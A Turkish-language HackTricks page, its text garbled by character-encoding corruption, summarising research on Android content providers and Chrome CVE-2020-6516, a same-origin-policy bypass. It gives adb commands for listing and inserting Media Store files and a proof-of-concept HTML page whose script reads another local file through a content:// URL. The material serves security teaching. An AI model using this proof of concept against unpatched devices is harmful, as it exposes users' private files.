<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>


**Bu, [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/) adlÄ± yazÄ±nÄ±n Ã¶zeti.**

### Medya Deposunda DosyalarÄ± Listeleme
Medya Deposu tarafÄ±ndan yÃ¶netilen dosyalarÄ± listelemek iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±labilir:
```bash
$ content query --uri content://media/external/file
```
Daha insan dostu bir Ã§Ä±ktÄ± iÃ§in, yalnÄ±zca her dizinlenmiÅŸ dosyanÄ±n tanÄ±mlayÄ±cÄ±sÄ±nÄ± ve yolunu gÃ¶rÃ¼ntÃ¼leyin:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Ä°Ã§erik saÄŸlayÄ±cÄ±lar kendi Ã¶zel ad alanlarÄ±nda izole edilir. Bir saÄŸlayÄ±cÄ±ya eriÅŸim, belirli bir `content://` URI gerektirir. Bir saÄŸlayÄ±cÄ±ya eriÅŸmek iÃ§in yol bilgileri, uygulama manifestlerinden veya Android Ã§erÃ§evesinin kaynak kodundan elde edilebilir.

### Chrome'un Ä°Ã§erik SaÄŸlayÄ±cÄ±lara EriÅŸimi
Android'deki Chrome, `content://` ÅŸemasÄ± aracÄ±lÄ±ÄŸÄ±yla iÃ§erik saÄŸlayÄ±cÄ±lara eriÅŸebilir ve Ã¼Ã§Ã¼ncÃ¼ taraf uygulamalar tarafÄ±ndan dÄ±ÅŸa aktarÄ±lan fotoÄŸraf veya belgeler gibi kaynaklara eriÅŸebilir. Bunun Ã¶rneÄŸini vermek iÃ§in, bir dosya Medya Deposuna eklenir ve ardÄ±ndan Chrome Ã¼zerinden eriÅŸilir:

Medya Deposuna Ã¶zel bir giriÅŸ ekleyin:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Yeni eklenen dosyanÄ±n tanÄ±mlayÄ±cÄ±sÄ±nÄ± keÅŸfedin:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Dosya, dosyanÄ±n tanÄ±mlayÄ±cÄ±sÄ±yla oluÅŸturulan bir URL kullanÄ±larak Chrome'da gÃ¶rÃ¼ntÃ¼lenebilir.

Ã–rneÄŸin, belirli bir uygulamayla ilgili dosyalarÄ± listelemek iÃ§in:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

_Same Origin Policy_ (SOP), tarayÄ±cÄ±larda web sayfalarÄ±nÄ±n farklÄ± kÃ¶kenlere ait kaynaklarla etkileÅŸimini, Cross-Origin-Resource-Sharing (CORS) politikasÄ± tarafÄ±ndan aÃ§Ä±kÃ§a izin verilmediÄŸi sÃ¼rece kÄ±sÄ±tlayan bir gÃ¼venlik protokolÃ¼dÃ¼r. Bu politika, bilgi sÄ±zÄ±ntÄ±larÄ±nÄ± ve cross-site request forgery'yi Ã¶nlemeyi amaÃ§lar. Chrome, `content://`'yi yerel bir ÅŸema olarak kabul eder ve her bir yerel ÅŸema URL'sinin ayrÄ± bir kÃ¶ken olarak iÅŸlem gÃ¶rdÃ¼ÄŸÃ¼ daha sÄ±kÄ± SOP kurallarÄ± uygular.

Ancak, CVE-2020-6516, Chrome'da `content://` URL'si aracÄ±lÄ±ÄŸÄ±yla yÃ¼klenen kaynaklar iÃ§in SOP kurallarÄ±nÄ±n atlanmasÄ±na izin veren bir gÃ¼venlik aÃ§Ä±ÄŸÄ±ydÄ±. Bu aÃ§Ä±k sayesinde, `content://` URL'si Ã¼zerinden yÃ¼klenen JavaScript kodu, Ã¶zellikle Android 10'dan Ã¶nceki sÃ¼rÃ¼mlerde kapsamlÄ± depolama uygulanmadÄ±ÄŸÄ± iÃ§in Ã¶nemli bir gÃ¼venlik endiÅŸesi olan diÄŸer `content://` URL'si Ã¼zerinden yÃ¼klenen kaynaklara eriÅŸebiliyordu.

AÅŸaÄŸÄ±daki Ã¶rnek, bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± gÃ¶stermektedir. Bir HTML belgesi, **/sdcard** altÄ±na yÃ¼klendikten sonra Medya Deposuna eklenir ve JavaScript'te `XMLHttpRequest` kullanarak Medya Deposundaki baÅŸka bir dosyanÄ±n iÃ§eriÄŸine eriÅŸir ve iÃ§eriÄŸini gÃ¶rÃ¼ntÃ¼ler. Bu sayede SOP kurallarÄ±nÄ± atlamÄ±ÅŸ olur.

Ã–rnek HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
